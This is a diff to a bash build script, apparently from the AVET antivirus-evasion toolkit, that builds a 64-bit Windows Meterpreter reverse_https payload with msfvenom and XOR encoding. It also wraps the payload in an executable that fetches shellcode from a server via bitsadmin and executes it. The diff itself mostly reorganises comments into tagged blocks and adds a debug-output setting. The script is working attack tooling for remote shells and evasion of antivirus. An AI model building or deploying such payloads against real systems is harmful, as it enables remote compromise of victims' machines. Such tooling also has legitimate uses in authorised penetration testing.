@@ -1,10 +1,10 @@
 #!/bin/bash 
-# Downloads and executes 64-bit shellcode, using bitsadmin. Applies metasploit XOR encoding.
 
-# The generated msf shellcode file needs to be hosted on a HTTP server
-# Call the executable like:
-# output.exe http://yourserver/thepayload.bin
-# Downloads the payload to disk, then reads the file and executes the payload.
+
+#DESCRIPTION_START
+# Downloads and executes 64-bit shellcode, using bitsadmin. Applies metasploit XOR encoding.
+#DESCRIPTION_END
+
 
 # print AVET logo
 cat banner.txt
@@ -20,9 +20,15 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug output
+enable_debug_print to_file C:/users/public/avetdbg.txt
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin
@@ -58,3 +64,11 @@ echo "The generated msf shellcode file needs to be hosted on a HTTP server
 Call the executable like:
 downloadbitsadmin_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
 Downloads the payload to disk, then reads the file and executes the payload."
+
+
+#USAGE_START
+# The generated msf shellcode file needs to be hosted on a HTTP server
+# Call the executable like:
+# output.exe http://yourserver/thepayload.bin
+# Downloads the payload to disk, then reads the file and executes the payload.
+#USAGE_END
